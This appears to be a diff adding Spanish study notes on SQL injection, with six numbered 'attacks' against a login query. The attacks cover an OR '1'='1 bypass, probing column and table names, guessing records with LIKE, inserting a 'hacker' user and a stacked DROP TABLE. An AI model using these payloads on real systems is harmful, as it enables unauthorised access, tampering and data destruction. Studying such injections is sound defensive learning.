@@ -1,0 +1,65 @@
+select * from persona where usuario='' or 1=1; 
+ /*'and password = '/*-'
+
+
+ataque 1
+Para comprobar si la aplicación incluye los datos enviados por el usuario 
+sin ningún tratamiento previo, podemos 
+enviar una comilla (simple o doble) como dato.
+"loquesea
+loquesea
+
+loquesea
+loquesea' OR'1'='1
+
+SELECT * FROM usuario='jquispe'
+and contrasenia='12345'OR'1'='1;
+
+
+ataque 2
+saber el nombre del campo
+SELECT COUNT(*) FROM persona
+WHERE usuario='loquesea'
+AND contrasenia='loquesea';
+
+SELECT COUNT(*) FROM persona
+WHERE usuario='' AND usuario is NULL; --'
+
+usuario jquispe
+contrasenia jquispe 'and usuario='jquispe
+
+usuario jquispe
+contrasenia jquispe 'and usuario is null;--
+
+ataque 3
+saber el nombre de la tabla
+primer consulta
+con esta nos da a entender que no existe una tabla llamada usuarios
+SELECT COUNT(*) FROM tabla
+WHERE campo1='loquesea'
+AND campo2='loquesea' AND 1=(SELECT COUNT(*) FROM usuarios); --'
+
+segunda consulta 
+SELECT COUNT(*) FROM tabla
+WHERE campo1='loquesea'
+AND campo2='loquesea' AND 1=(SELECT COUNT(*) FROM tabla);--
+
+ataque  4
+Averiguar el contenido de los registros
+
+SELECT COUNT(*) FROM persona
+WHERE campo1='loquesea'
+AND campo2='loquesea' OR user LIKE 'a%';--
+
+ataque 5
+anidadir un nuevo usuario
+
+SELECT COUNT(*) FROM tabla
+WHERE campo1='loquesea'
+AND campo2='loquesea'; INSERT INTO tabla VALUES (NULL, 'hacker', 'hacker'); --
+
+ataque 6
+borrar tabla
+SELECT COUNT(*) FROM tabla
+WHERE campo1='loquesea'
+AND campo2='loquesea'; DROP TABLE tabla; --
